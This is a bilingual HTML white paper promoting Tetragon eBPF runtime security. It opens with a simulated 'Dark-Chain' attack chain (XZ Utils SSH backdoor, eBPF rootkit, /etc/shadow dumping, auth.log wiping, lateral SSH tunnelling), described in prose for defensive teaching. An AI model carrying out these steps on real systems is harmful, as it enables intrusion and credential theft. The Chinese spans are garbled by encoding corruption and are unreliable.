                    <span lang="zh">æœ€åæ›´æ–°ï¼š2026-01-04</span><span lang="en">Last Updated: 2026-01-04</span>
                </div>

                <p class="hero-sub">
                    <span lang="zh">åœ¨ç°ä»£åŒ–çš„ IT æ¶æ„ä¸­ï¼Œå¤–å›´é˜²ç«å¢™å·²ä¸è¶³åŠåº”å¯¹å¨èƒã€‚Tetragon åˆ©ç”¨ eBPF æŠ€æœ¯ï¼Œå°†å®‰å…¨é˜²å¾¡ä¸‹æ²‰è‡³ Linux
                        å†…æ ¸æœ€æ·±å¤„ï¼Œå®ç°çœŸæ­£çš„äºšæ¯«ç§’çº§å®æ—¶é˜»æ–­ã€‚</span>
                    <span lang="en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon
                        utilizes eBPF technology to embed security deep into the Linux kernel for true real-time
                        enforcement.</span>
                </p>

                <div class="winston-promise">
                    <div style="font-size: 2rem;">ğŸ’¡</div>
                    <div>
                        <strong><span lang="zh">ä»Šæ—¥æ‰¿è¯º (The Promise):</span><span lang="en">Today's
                                Promise:</span></strong>
                        <p style="margin:0; font-size: 0.95rem; color: rgba(255,255,255,0.9);">
                            <span lang="zh">é˜…è¯»æœ¬ç™½çš®ä¹¦åï¼Œä½ å°†ç†è§£å¦‚ä½•åˆ©ç”¨ eBPF å°†é˜²å¾¡å»¶è¿Ÿä»åˆ†é’Ÿçº§é™ä½è‡³å¾®ç§’çº§ï¼Œå¹¶æŒæ¡åœ¨ä¸ä¾µå…¥åº”ç”¨ä»£ç çš„å‰æä¸‹å®ç°â€œé›¶ä¿¡ä»»è¿è¡Œæ—¶â€çš„å®æˆ˜æ–¹æ³•ã€‚æœ¬æ–‡ç”±Rao Weiboå€ŸåŠ©Geminiå®Œæˆã€‚</span>
                            <span lang="en">After reading this white paper, you will understand how to use eBPF to
                                reduce defense latency from minutes to microseconds, and master the practical method of
                                achieving "Zero Trust Runtime" without intruding into application code. This blog was created by Rao Weibo through Gemini.</span>
                        </p>
                    </div>
                </div>

                <div style="display:flex; gap:16px; margin-top: 30px;">
                    <button class="btn-primary" onclick="scrollToId('dark-chain-story')"
                        style="background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.3s;">
                        <span lang="zh">è¿›å…¥ Dark-Chain ä»¿çœŸå®¤</span><span lang="en">Enter Dark-Chain Simulator</span>
                    </button>
                    <button class="btn-outline"
                        style="background: transparent; border: 2px solid white; color: white; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.3s;"
                        onclick="scrollToId('how-it-works')">
                        <span lang="zh">æŠ€æœ¯åŸç†</span><span lang="en">Technical Principles</span>
                    </button>
                </div>
            </div>
        </header>
        <!-- Case Zero: Dark-Chain Storytelling & Simulation -->
        <section id="dark-chain-story">
            <div class="container">
                <p style="color: var(--cisco-midnight); font-weight: 600; text-align: center; margin-bottom: 20px;">
                    <span lang="zh">[ Case Zero: å»ºç«‹å±æœºæ„Ÿ ]</span><span lang="en">[ Case Zero: Establishing Urgency
                        ]</span>
                </p>

                <div class="section-header">
                    <h2><span lang="zh">å½“é˜²å¾¡â€œå¤±æ•ˆâ€ï¼šDark-Chain å±æœºæ¨¡æ‹Ÿ</span><span lang="en">When Defense Fails: Dark-Chain
                            Crisis Simulation</span></h2>

                    <div
                        style="text-align: left; background: #fff; padding: 30px; border-radius: 12px; border: 1px solid var(--cisco-platinum); margin-bottom: 40px;">
                        <p><span lang="zh">ä½ æ˜¯ä¸€å SecOps è¿ç»´è´Ÿè´£äººã€‚ä½ çš„å…¬å¸ä¸€ä¸ªæœˆå‰ä¸Šçº¿äº†ä¸€ä¸ªæ–°çš„çº¿ä¸Šå®¢æˆ·äº¤äº’å¹³å°<b>â€œMy Dear
                                    Customerâ€</b>ã€‚å¾—ç›Šäºå‡ºè‰²çš„ç”¨æˆ·ä½“éªŒï¼Œç›®å‰è¯¥å¹³å°æ—¥æ´»ç”¨æˆ·é«˜è¾¾ 100 ä¸‡ï¼Œå…¬å¸å†…éƒ¨æ­£æ²‰æµ¸åœ¨ä¸šåŠ¡æ¬£æ¬£å‘è£çš„å–œæ‚¦ä¸­ã€‚</span><span
                                lang="en">You are a SecOps lead. Your company launched a new platform <b>"My Dear
                                    Customer"</b> a month ago. With 1 million daily active users, the company is
                                celebrating its booming business.</span></p>
                        <p style="margin-top: 10px;"><span lang="zh">ç„¶è€Œï¼Œåœ¨æŸä¸€ä¸ªä¸è¢«äººçŸ¥çš„è§’è½é‡Œï¼Œæ½œè—ç€ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„æ¼æ´ã€‚å°±åœ¨ä½ çš„å…¬å¸å‡†å¤‡ä¸ºç´¯ç§¯ç”¨æˆ·é‡çªç ´ 500
                                ä¸‡å¤§å…³ä¸¾è¡Œåº†ç¥é¦™æ§Ÿä¼šæ—¶ï¼ŒXZ Utils ä¾›åº”é“¾æ¼æ´è¢«ä¸€ä¸ªä»£å·ä¸º<b>â€œDark-Chainâ€</b>çš„æ”»å‡»å°ç»„æ¿€æ´»ã€‚</span><span
                                lang="en">However, in a hidden corner, a sophisticated vulnerability lurks. As you
                                prepare to celebrate 5 million users, the XZ Utils supply chain flaw is activated by an
                                attack group codenamed <b>"Dark-Chain"</b>.</span></p>
                        <p style="margin-top: 10px; font-weight: 600; color: var(--cisco-red);"><span
                                lang="zh">ä»–ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼šé€šè¿‡åŠ å¯†ä½ é‚£å¼•ä»¥ä¸ºå‚²çš„ 500
                                ä¸‡ç”¨æˆ·æ ¸å¿ƒæ•°æ®ï¼Œå¯¹å…¬å¸è¿›è¡Œå‹’ç´¢ï¼Œå¹¶åœ¨æš—ç½‘å…¬å¼€å«ä»·ã€‚æ­¤æ—¶ï¼Œä½ æ‰‹ä¸­çš„ä¼ ç»Ÿé˜²ç«å¢™ä¸æ‰«æå™¨ï¼Œæ­£å¤„äºä¸€ç§è¯¡å¼‚çš„â€œé™é»˜â€çŠ¶æ€...</span><span lang="en">Their
                                goal is clear: encrypting your core data for ransom and auctioning it on the dark web.
                                Meanwhile, your traditional firewalls and scanners remain eerily silent...</span></p>
                    </div>
                </div>
                <!-- MITRE ATT&CK Path Visualization -->
                <div
                    style="background: #F8FAFC; padding: 40px; border-radius: 16px; margin-bottom: 40px; border: 1px solid var(--cisco-platinum); text-align: center;">
                    <h4 style="margin-bottom: 30px; color: var(--cisco-midnight);"><span lang="zh">Dark-Chain æ”»å‡»å…¨æ™¯å›¾
                            (MITRE ATT&CK Path)</span><span lang="en">Dark-Chain Attack Landscape (MITRE ATT&CK
                            Path)</span></h4>
<div class="svg-scroll-wrapper">
    <svg width="1000" height="160" viewBox="0 0 1000 160" class="attack-landscape-svg" xmlns="http://www.w3.org/2000/svg">
        <defs>
            <marker id="arrow-blue-path" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
                <path d="M0,0 L0,6 L9,3 z" fill="#049FD9" />
            </marker>
            <marker id="arrow-red-path" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
                <path d="M0,0 L0,6 L9,3 z" fill="#E2231A" />
            </marker>
        </defs>
        <rect x="20" y="40" width="160" height="80" rx="8" fill="#FFF" stroke="#E4E4E4" stroke-width="2" />
        <text x="100" y="75" text-anchor="middle" font-size="12" font-weight="bold" fill="#0D274D">
            <tspan lang="zh">åˆå§‹è®¿é—®</tspan><tspan lang="en">Initial Access</tspan>
        </text>
        <text x="100" y="95" text-anchor="middle" font-size="10" fill="#58585B">T1195.002</text>
        <text x="100" y="110" text-anchor="middle" font-size="9" fill="#888">
            <tspan lang="zh">ä¾›åº”é“¾æŸå®³</tspan><tspan lang="en">Supply Chain Compromise</tspan>
        </text>

        <rect x="220" y="40" width="160" height="80" rx="8" fill="#FFF" stroke="#E4E4E4" stroke-width="2" />
        <text x="300" y="75" text-anchor="middle" font-size="12" font-weight="bold" fill="#0D274D">
            <tspan lang="zh">ææƒä¸æŒä¹…åŒ–</tspan><tspan lang="en">Privilege Escalation</tspan>
        </text>
        <text x="300" y="95" text-anchor="middle" font-size="10" fill="#58585B">T1014 / Rootkit</text>

        <rect x="420" y="40" width="160" height="80" rx="8" fill="#FFF" stroke="#E4E4E4" stroke-width="2" />
        <text x="500" y="75" text-anchor="middle" font-size="12" font-weight="bold" fill="#0D274D">
            <tspan lang="zh">å‡­æ®è·å–</tspan><tspan lang="en">Credential Access</tspan>
        </text>
        <text x="500" y="95" text-anchor="middle" font-size="10" fill="#58585B">T1003.001</text>

        <rect x="620" y="40" width="160" height="80" rx="8" fill="#FFF" stroke="#E4E4E4" stroke-width="2" />
        <text x="700" y="75" text-anchor="middle" font-size="12" font-weight="bold" fill="#0D274D">
            <tspan lang="zh">é˜²å¾¡é€ƒé€¸</tspan><tspan lang="en">Defense Evasion</tspan>
        </text>
        <text x="700" y="95" text-anchor="middle" font-size="10" fill="#58585B">T1070</text>

        <rect x="820" y="40" width="160" height="80" rx="8" fill="#FFEDEB" stroke="#E2231A" stroke-width="2" />
        <text x="900" y="75" text-anchor="middle" font-size="12" font-weight="bold" fill="#E2231A">
            <tspan lang="zh">æ¨ªå‘ç§»åŠ¨</tspan><tspan lang="en">Lateral Movement</tspan>
        </text>
        <text x="900" y="95" text-anchor="middle" font-size="10" fill="#E2231A">T1021</text>

        <path d="M 180 80 L 220 80" stroke="#049FD9" stroke-width="3" fill="none" marker-end="url(#arrow-blue-path)" />
        <path d="M 380 80 L 420 80" stroke="#049FD9" stroke-width="3" fill="none" marker-end="url(#arrow-blue-path)" />
        <path d="M 580 80 L 620 80" stroke="#049FD9" stroke-width="3" fill="none" marker-end="url(#arrow-blue-path)" />
        <path d="M 780 80 L 820 80" stroke="#E2231A" stroke-width="3" fill="none" marker-end="url(#arrow-red-path)" />
    </svg>
</div>
                </div>
            </div>
            <div class="container">
                <div class="simulation-grid">
                    <div id="attack-steps">
                        <button class="attack-stage-btn" onclick="runDarkChainStep(1)" id="dc-btn-1">
                            <div style="font-size: 0.7rem; color: #888;">PHASE 1 (T1195.002)</div>
                            <strong>
                                <span lang="zh">åˆå§‹è®¿é—®ï¼šå¹½çµå…¥å£æ¿€æ´»</span>
                                <span lang="en">Initial Access: Ghost Entry Activated</span>
                            </strong>
                            <p lang="zh" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">é€šè¿‡ç‰¹åˆ¶å…¬é’¥è§¦å‘ IFUNC åŠ«æŒï¼Œç»•è¿‡
                                SSH è®¤è¯é€»è¾‘ã€‚</p>
                            <p lang="en" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">Triggering IFUNC
                                hijacking via a crafted public key to bypass SSH authentication logic.</p>
                        </button>

                        <button class="attack-stage-btn" onclick="runDarkChainStep(2)" id="dc-btn-2">
                            <div style="font-size: 0.7rem; color: #888;">PHASE 2 (T1014)</div>
                            <strong>
                                <span lang="zh">ææƒæŒä¹…åŒ–ï¼šæ¤å…¥ eBPF Rootkit</span>
                                <span lang="en">Privilege Escalation: Implanting eBPF Rootkit</span>
                            </strong>
                            <p lang="zh" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">
                                åˆ©ç”¨å†…æ ¸é’©å­éšè—æ¶æ„è¿›ç¨‹ï¼Œç¡®ä¿æ”»å‡»è€…é•¿æœŸé©»ç•™ã€‚</p>
                            <p lang="en" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">Using kernel hooks to
                                hide malicious processes, ensuring persistent attacker presence.</p>
                        </button>

                        <button class="attack-stage-btn" onclick="runDarkChainStep(3)" id="dc-btn-3">
                            <div style="font-size: 0.7rem; color: #888;">PHASE 3 (T1003.001)</div>
                            <strong>
                                <span lang="zh">å‡­æ®è·å–ï¼šé™é»˜è¯»å– Shadow</span>
                                <span lang="en">Credential Access: Silent Shadow Reading</span>
                            </strong>
                            <p lang="zh" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">åœ¨ Root
                                æƒé™ä¸‹è½¬å‚¨æ•æ„Ÿå‡­æ®ï¼Œè·å–å…¨ç½‘è´¦æˆ·æ§åˆ¶æƒã€‚</p>
                            <p lang="en" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">Dumping sensitive
                                credentials with Root privileges to gain network-wide account control.</p>
                        </button>

                        <button class="attack-stage-btn" onclick="runDarkChainStep(4)" id="dc-btn-4">
                            <div style="font-size: 0.7rem; color: #888;">PHASE 4 (T1070)</div>
                            <strong>
                                <span lang="zh">é˜²å¾¡é€ƒé€¸ï¼šæ“¦é™¤è¡Œä¸ºè¸ªè¿¹</span>
                                <span lang="en">Defense Evasion: Clearing Behavior Traces</span>
                            </strong>
                            <p lang="zh" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">æš´åŠ›æ¸…é™¤
                                /var/log/auth.logï¼Œå¹¶ä¼ªé€ æ–‡ä»¶è®¿é—®æ—¶é—´æˆ³ã€‚</p>
                            <p lang="en" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">Forcefully clearing
                                /var/log/auth.log and forging file access timestamps.</p>
                        </button>

                        <button class="attack-stage-btn" onclick="runDarkChainStep(5)" id="dc-btn-5">
                            <div style="font-size: 0.7rem; color: #888;">PHASE 5 (T1021)</div>
                            <strong>
                                <span lang="zh">æ¨ªå‘ç§»åŠ¨ï¼šé”å®šæ ¸å¿ƒæ•°æ®åº“</span>
                                <span lang="en">Lateral Movement: Targeting Core Database</span>
                            </strong>
                            <p lang="zh" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">åˆ©ç”¨è·å–çš„å‡­æ®ï¼Œå»ºç«‹ SSH
                                éš§é“å‡†å¤‡æ‰§è¡Œæœ€ç»ˆå‹’ç´¢ã€‚</p>
                            <p lang="en" style="font-size: 0.8rem; margin: 5px 0 0; color: #666;">Using obtained
                                credentials to establish an SSH tunnel for the final ransomware execution.</p>
                        </button>
                    </div>

                    <div class="attacker-terminal">
                        <div class="terminal-header-red">
                            <div class="dot red"></div>
                            <div class="dot yellow"></div>
                            <div class="dot green"></div>
                            <span class="terminal-title">attacker@dark-chain: ~ (Interactive Exploit)</span>
                        </div>
                        <div class="terminal-content-attack" id="dc-log">
                            <div style="opacity: 0.5;">
                                <span lang="zh">[è¯·é€‰æ‹©å·¦ä¾§æ”»å‡»è·¯å¾„å¼€å§‹æ¨¡æ‹Ÿæ¶æ„æµé‡åŠ¨ä½œ...]</span>
                                <span lang="en">[Select an attack path on the left to simulate malicious
                                    traffic...]</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container">
                <div style="margin-top: 50px;">
                    <h3 style="text-align: center; margin-bottom: 30px;">
                        <span lang="zh">ä¸ºä»€ä¹ˆä¼ ç»Ÿå®‰å…¨é˜²å¾¡åœ¨ Dark-Chain é¢å‰å…¨çº¿æºƒè´¥ï¼Ÿ</span>
                        <span lang="en">Why Traditional Defenses Fail Against Dark-Chain?</span>
                    </h3>
                    <div class="blindspot-table-wrapper">
                    <table class="blindspot-table">
                        <thead>
                            <tr>
                                <th width="15%"><span lang="zh">æ”»å‡»é˜¶æ®µ</span><span lang="en">Stage</span></th>
                                <th width="20%"><span lang="zh">MITRE æŠ€æœ¯</span><span lang="en">MITRE Technique</span>
                                </th>
                                <th width="35%"><span lang="zh">æ”»å‡»åŠ¨ä½œæè¿°</span><span lang="en">Attack Description</span>
                                </th>
                                <th width="30%" class="highlight-red"><span lang="zh">ä¼ ç»Ÿé˜²å¾¡ç›²åŒº (Why it Fails)</span><span
                                        lang="en">Traditional Blindspot</span></th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><span lang="zh">åˆå§‹è®¿é—®</span><span lang="en">Access</span></td>
                                <td>T1195.002</td>
                                <td><span lang="zh">æ¶æ„ä»£ç é€šè¿‡ <code>dlopen</code> åœ¨å†…å­˜è¿è¡Œï¼Œåé—¨éšè—åœ¨åˆæ³•åŠ å¯†æµä¸­ã€‚</span><span
                                        lang="en">Malicious code runs in memory via <code>dlopen</code>; backdoors hide
                                        in encrypted streams.</span></td>
                                <td><b class="highlight-red"><span lang="zh">WAF/é˜²ç«å¢™</span><span
                                            lang="en">WAF/Firewall</span></b> <span lang="zh">æ— æ³•è§£å¯†åˆæ³•çš„ TLS/SSH
                                        å†…éƒ¨æŒ‡ä»¤ã€‚</span><span lang="en">cannot decrypt legitimate internal TLS/SSH
                                        commands.</span></td>
                            </tr>
                            <tr>
                                <td><span lang="zh">ææƒæŒä¹…åŒ–</span><span lang="en">Persistence</span></td>
                                <td>T1014</td>
                                <td><span lang="zh">ä¿®æ”¹ Syscall Tableï¼ŒåŠ¨æ€å‰”é™¤æ¶æ„è¿›ç¨‹åœ¨ <code>ps/top</code> ä¸­çš„æ˜¾ç¤ºã€‚</span><span
                                        lang="en">Modifying Syscall Table to hide malicious processes from
                                        <code>ps/top</code>.</span></td>
                                <td><b class="highlight-red"><span lang="zh">ä¸»æœº IDS</span><span lang="en">Host
                                            IDS</span></b> <span lang="zh">åœ¨è¢«ç¯¡æ”¹çš„å†…æ ¸é¢å‰çœ‹åˆ°çš„æ˜¯â€œè™šå‡çš„å®‰å…¨â€ã€‚</span><span
                                        lang="en">sees "fake security" when the kernel itself is compromised.</span>
                                </td>
                            </tr>
                            <tr>
                                <td><span lang="zh">å‡­æ®è·å–</span><span lang="en">Credentials</span></td>
                                <td>T1003.001</td>
                                <td><span lang="zh">é«˜æƒé™è¿›ç¨‹åˆæ³•è¯»å– <code>/etc/shadow</code> æˆ–å†…å­˜ä¸­çš„ Session å¯†é’¥ã€‚</span><span
                                        lang="en">Privileged processes "legally" read <code>/etc/shadow</code> or
                                        Session keys.</span></td>
                                <td><b class="highlight-red"><span lang="zh">æƒé™æ¨¡å‹</span><span lang="en">RBAC
                                            Model</span></b> <span lang="zh">çœ‹èµ·æ¥æ­£å¸¸ã€‚å®¡è®¡æ—¥å¿—æ— æ³•åŒºåˆ†â€œæ­£å¸¸å¤‡ä»½â€ä¸â€œæ¶æ„è½¬å‚¨â€ã€‚</span><span
                                        lang="en">appears normal; logs cannot distinguish "normal backups" from "malicious dumps".</span></td>
                            </tr>
                            <tr>
                                <td><span lang="zh">é˜²å¾¡é€ƒé€¸</span><span lang="en">Evasion</span></td>
                                <td>T1070</td>
                                <td><span lang="zh">å®æ—¶æ“¦é™¤ <code>auth.log</code> è®°å½•ï¼Œå¹¶åˆ©ç”¨ Rootkit æ‹¦æˆªæ—¥å¿—å†™å…¥åŠ¨ä½œã€‚</span><span
                                        lang="en">Erasing <code>auth.log</code> in real-time and intercepting log writes
                                        via Rootkit.</span></td>
                                <td><b class="highlight-red"><span lang="zh">æ—¥å¿—å®¡è®¡ (SIEM)</span><span lang="en">SIEM
                                            Audit</span></b> <span lang="zh">åªèƒ½åˆ†æ"å·²å‘ç”Ÿçš„è®°å½•"ï¼Œæ— æ³•æ„ŸçŸ¥"è¢«æŠ¹é™¤çš„ç©ºç™½"ã€‚</span><span
                                        lang="en">only analyzes "existing records", missing the "erased white
                                        space."</span></td>
                            </tr>
                            <tr>
                                <td><span lang="zh">æ¨ªå‘ç§»åŠ¨</span><span lang="en">Lateral</span></td>
                                <td>T1021</td>
                                <td><span lang="zh">ä½¿ç”¨åˆæ³•å‡­æ®å»ºç«‹åŠ å¯†éš§é“ï¼Œåœ¨å†…ç½‘ä¸åŒå®‰å…¨åŸŸä¹‹é—´æ¸—é€ã€‚</span><span lang="en">Using valid
                                        credentials to build encrypted tunnels for internal pivoting.</span></td>
                                <td><b class="highlight-red"><span lang="zh">å†…ç½‘éš”ç¦»</span><span
                                            lang="en">Micro-seg</span></b> <span
                                        lang="zh">å¯¹äºå·²è·å–åˆæ³•èº«ä»½çš„æ¨ªå‘ç§»åŠ¨ç¼ºä¹ç»†ç²’åº¦çš„è¡Œä¸ºè¯†åˆ«ã€‚</span><span lang="en">lacks fine-grained
                                        behavior recognition for hijacked identities.</span></td>
                            </tr>
                        </tbody>
                    </table></div>
                </div>

                <div class="highlight-box" style="margin-top: 40px; border-left-color: var(--cisco-orange);">
                    <strong><span lang="zh">å®‰å…¨èŒƒå¼çš„è·ƒè¿ (The Paradigm Shift):</span><span lang="en">The Paradigm
                            Shift:</span></strong>
                    <span lang="zh">ä¼ ç»Ÿçš„â€œé™æ€ç‰¹å¾é˜²æŠ¤â€å·²æ­»ã€‚åœ¨ Dark-Chain åœºæ™¯ä¸‹ï¼Œæ”»å‡»è€…ä¸å†æ˜¯â€œå¤–äººâ€ï¼Œä»–ä»¬åˆ©ç”¨ä¾›åº”é“¾æ¼æ´æˆä¸ºäº†â€œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†â€ã€‚</span>
                    <span lang="en">Traditional "static signature defense" is dead. In Dark-Chain scenarios, attackers
                        are no longer "outsiders"â€”they become "part of the system."</span>
                    <br><br>
                    <span lang="zh">è¿è¡Œæ—¶å®‰å…¨çš„æ ¸å¿ƒç†å¿µæ˜¯ï¼š</span><b style="color:var(--cisco-midnight)"><span
                            lang="zh">ä¸çœ‹ä½ â€œé•¿ä»€ä¹ˆæ ·â€ï¼ˆé™æ€ç‰¹å¾ï¼‰ï¼Œè€Œçœ‹ä½ â€œåœ¨åšä»€ä¹ˆâ€ï¼ˆè¿è¡Œæ—¶è¡Œä¸ºï¼‰ã€‚</span><span lang="en">Runtime security focus:
                            Don't look at "what it is" (signatures), look at "what it does" (behavior).</span></b>
                </div>
            </div>
        </section>
        <section id="what-is-runtime" style="padding: 80px 0;">
            <div class="container">
                <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 40px;">
                    <span lang="zh">[ 1/4: å»ºç«‹å…±è¯† ]</span><span lang="en">[ 1/4: Building Consensus ]</span>
                </p>

                <div class="section-header">
                    <h2>
                        <span lang="zh">ä»€ä¹ˆæ˜¯è¿è¡Œæ—¶å®‰å…¨ï¼Ÿ</span>
                        <span lang="en">What is Runtime Security?</span>
                    </h2>
                    <p>
                        <span lang="zh">è¿è¡Œæ—¶å®‰å…¨æ˜¯æŒ‡åœ¨åº”ç”¨ç¨‹åº<b>æ‰§è¡Œè¿‡ç¨‹ä¸­</b>å¯¹å…¶è¿›è¡Œç›‘æ§å’Œé˜²æŠ¤ã€‚å®ƒå…³æ³¨çš„æ˜¯â€œç°åœ¨æ­£åœ¨å‘ç”Ÿä»€ä¹ˆâ€ï¼Œè€Œä¸æ˜¯ä»£ç åœ¨æ„å»ºæ—¶æ˜¯ä»€ä¹ˆæ ·å­ã€‚</span>
                        <span lang="en">Runtime security refers to monitoring and protecting applications <b>during
                                execution</b>. It focuses on "what is happening now" rather than what the code looked
                            like at build time.</span>
                    </p>
                </div>

                <div class="view-section">
                    <div class="highlight-box">
                        <strong>
                            <span lang="zh">æ ¸å¿ƒä»·å€¼ï¼šå¼¥è¡¥â€œå·¦ç§»å®‰å…¨â€çš„ç›²åŒº</span>
                            <span lang="en">Core Value: Bridging the "Shift Left" Blind Spot</span>
                        </strong>
                        <p>
                            <span lang="zh">å³ä½¿é•œåƒæ‰«æå’Œé™æ€é…ç½®åˆ†æï¼ˆShift Leftï¼‰æ˜¯å®Œç¾çš„ï¼Œä¹Ÿæ— æ³•è¦†ç›– 0-day æ¼æ´åˆ©ç”¨ã€ä¾›åº”é“¾æ±¡æŸ“æˆ–è¿è¡Œæ—¶çš„ç‰¹æƒæå‡ã€‚è¿è¡Œæ—¶å®‰å…¨æä¾›
                                <b>â€œShield Rightâ€</b>ï¼Œåœ¨æ¶æ„è¡Œä¸ºå‘ç”Ÿçš„ç¬é—´æ„å»ºæœ€åä¸€é“é˜²çº¿ã€‚</span>
                            <span lang="en">Even if image scanning and static analysis (Shift Left) are perfect, they
                                cannot cover 0-day exploits, supply chain attacks, or runtime privilege escalation.
                                Runtime security provides <b>"Shield Right,"</b> building the final line of defense the
                                moment malicious behavior occurs.</span>
                        </p>

                        <div class="winston-bridge">
                            <strong><span lang="zh">é€»è¾‘æ¡¥æ¢ï¼š</span><span lang="en">Logic Bridge:</span></strong>
                            <span lang="zh">æ—¢ç„¶æ¼æ´ä¸å¯é¿å…åœ°ä¼šè¿›å…¥ç”Ÿäº§ç¯å¢ƒï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ‰§è¡Œè·¯å¾„ä¸Šå®‰ç½®â€œå…³å¡â€ã€‚</span>
                            <span lang="en">Since vulnerabilities inevitably enter production, we must place
                                "checkpoints" directly on the execution path.</span>
                        </div>

                        <div class="grid-3" style="margin-top: 30px;">
                            <div class="card" style="border-left: 4px solid var(--cisco-blue); border-top: none;">
                                <strong><span lang="zh">å·¦ç§»å®‰å…¨ (Shift Left)</span><span lang="en">Shift Left
                                        Security</span></strong>
                                <p style="font-size: 0.9rem; margin-top:10px;">
                                    <span lang="zh">å°†å®‰å…¨æ£€æŸ¥å‰ç§»åˆ°å¼€å‘é˜¶æ®µã€‚é€šè¿‡ä»£ç æ‰«æã€é•œåƒå®¡è®¡å‘ç°å·²çŸ¥ç¼ºé™·ï¼Œé˜²æ‚£äºæœªç„¶ã€‚</span>
                                    <span lang="en">Moving security checks forward to the development stage. Finding
                                        known defects through code scanning and image auditing to prevent trouble
                                        early.</span>
                                </p>
                            </div>
                            <div class="card" style="border-left: 4px solid var(--cisco-midnight); border-top: none;">
                                <strong><span lang="zh">è¿è¡Œæ—¶ç›¾ç‰Œ (Shield Right)</span><span lang="en">Shield Right
                                        (Runtime)</span></strong>
                                <p style="font-size: 0.9rem; margin-top:10px;">
                                    <span lang="zh">åœ¨ç”Ÿäº§è¿è¡Œé˜¶æ®µæ„å»ºå®æ—¶å±éšœã€‚åº”å¯¹é‚£äº›ç»•è¿‡å¼€å‘é˜¶æ®µæ£€æŸ¥çš„æœªçŸ¥å¨èƒï¼ˆ0-dayï¼‰æˆ–å†…éƒ¨ç ´åã€‚</span>
                                    <span lang="en">Building real-time barriers in production to address unknown threats
                                        (0-days) or internal compromises that bypass dev-phase checks.</span>
                                </p>
                            </div>
                        </div>
                    </div>

                    <div class="comparison-card">
                        <div class="comparison-header">
                            <span lang="zh">å®šä½å¯¹æ¯”ï¼šFalco (æ£€æµ‹) vs Tetragon (æ‰§æ³•)</span>
                            <span lang="en">Positioning: Falco (Detection) vs Tetragon (Enforcement)</span>
                        </div>
                        <div class="comparison-grid">
                            <div class="comparison-cell comparison-label"><span lang="zh">æ ¸å¿ƒèƒ½åŠ›</span><span
                                    lang="en">Core Capability</span></div>
                            <div class="comparison-cell"><strong>Falco: <span lang="zh">å®‰å…¨æ‘„åƒå¤´</span><span
                                        lang="en">Security Camera</span></strong></div>
                            <div class="comparison-cell"><strong>Tetragon: <span lang="zh">å†…æ ¸ç›¾ç‰Œ</span><span
                                        lang="en">Kernel Shield</span></strong></div>
                        </div>
                        <div class="comparison-grid">
                            <div class="comparison-cell comparison-label"><span lang="zh">å“åº”æ¨¡å‹</span><span
                                    lang="en">Response Model</span></div>
                            <div class="comparison-cell">
                                <span lang="zh"><strong>å¼‚æ­¥æ£€æµ‹ï¼š</strong>æ¶æ„è¡Œä¸ºå‘ç”Ÿåï¼Œæ¨é€åˆ°ç”¨æˆ·æ€åˆ†æå¹¶æŠ¥è­¦ã€‚</span>
                                <span lang="en"><strong>Asynchronous:</strong> Malicious acts are pushed to user-space for post-event
                                    analysis and alerting.</span>
                            </div>
                            <div class="comparison-cell">
                                <span lang="zh"><strong>åŒæ­¥é˜»æ–­ï¼š</strong>æ¶æ„è¡Œä¸ºåœ¨å†…æ ¸æ€è¢«è¯†åˆ«ï¼Œå¹¶åœ¨ syscall å®Œæˆå‰å³åˆ» Killã€‚</span>
                                <span lang="en"><strong>Synchronous:</strong> Malicious behavior is identified in-kernel and KILLED
                                    instantly before syscall completion.</span>
                            </div>
                        </div>
                        <div class="comparison-footer">
                            ğŸ’¡ <strong><span lang="zh">æ¶æ„å¸ˆè§†ç‚¹ï¼š</span><span lang="en">Architect's View:</span></strong>
                            <span lang="zh">Falco æ“…é•¿å¹¿åŸŸå®¡è®¡ä¸åŸºçº¿ç›‘æ§ï¼›Tetragon åˆ™ä¸ºå…³é”®ä¸šåŠ¡æä¾›<strong>â€œä¸å¯ç»•è¿‡â€</strong>çš„å®æ—¶å®‰å…¨å¥‘çº¦ã€‚</span>
                            <span lang="en">Falco excels at broad auditing; Tetragon provides an <strong>"unbypassable"</strong>
                                real-time security contract for mission-critical apps.</span>
                        </div>
                    </div>
                </div>

                <div class="view-section" style="margin-top: 50px;">
                    <div class="view-title">
                        <span lang="zh">ä¸»è¦ç›‘æ§ç»´åº¦</span>
                        <span lang="en">Primary Monitoring Dimensions</span>
                    </div>
<div class="grid-monitoring">
    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
        <strong><span lang="zh">è¿›ç¨‹æ‰§è¡Œ</span><span lang="en">Process Execution</span></strong>
        <p style="font-size: 0.9rem;"><span lang="zh">è¿½è¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„å…¨ç”Ÿå‘½å‘¨æœŸï¼šè°å¯åŠ¨äº†ç¨‹åºï¼Ÿæ˜¯å¦æ´¾ç”Ÿäº†éæ³•çš„å­è¿›ç¨‹æˆ– Shellï¼Ÿ</span><span lang="en">Tracking binary lifecycles: Who started the program? Did it spawn illegal child processes?</span></p>
    </div>
    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
        <strong><span lang="zh">æ–‡ä»¶è®¿é—®</span><span lang="en">File Access</span></strong>
